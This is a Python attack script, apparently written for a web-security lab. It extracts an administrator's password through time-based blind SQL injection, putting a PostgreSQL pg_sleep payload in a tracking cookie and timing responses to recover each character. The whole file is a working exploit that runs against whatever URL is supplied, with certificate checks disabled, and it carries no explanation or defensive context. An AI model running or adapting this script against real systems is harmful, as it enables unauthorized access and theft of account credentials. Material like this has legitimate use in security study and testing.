import sys
import requests
import urllib3
import click
import urllib


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def injection(url):
    password=""
    
    for i in range(1,21):
        for j in range(32,126):
            payload = "' || (select case when (username='administrator' and ascii(substring(password,%s,1))='%s') then pg_sleep(10) else pg_sleep(0) end from users)--" % (i,j)
            payload_encoded = urllib.parse.quote(payload)
            cookies = {'TrackingId':''+payload_encoded,'session':'junk'}
            
            resp = requests.get(url,cookies=cookies,verify=False)
            if int(resp.elapsed.total_seconds()) >= 10:
                password += chr(j)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password + chr(j))
                sys.stdout.flush()

    return password



@click.command()
@click.option('-u','--url',type=str,prompt="The URL of the vulnerable target",required=True,help="the URL of the vulnerable target")
def main(url):
    print("Retrieving Admin's password")
    password=injection(url)
    print(f"\nthe Administrator's passowrd is: {password}")


if __name__=="__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting program...")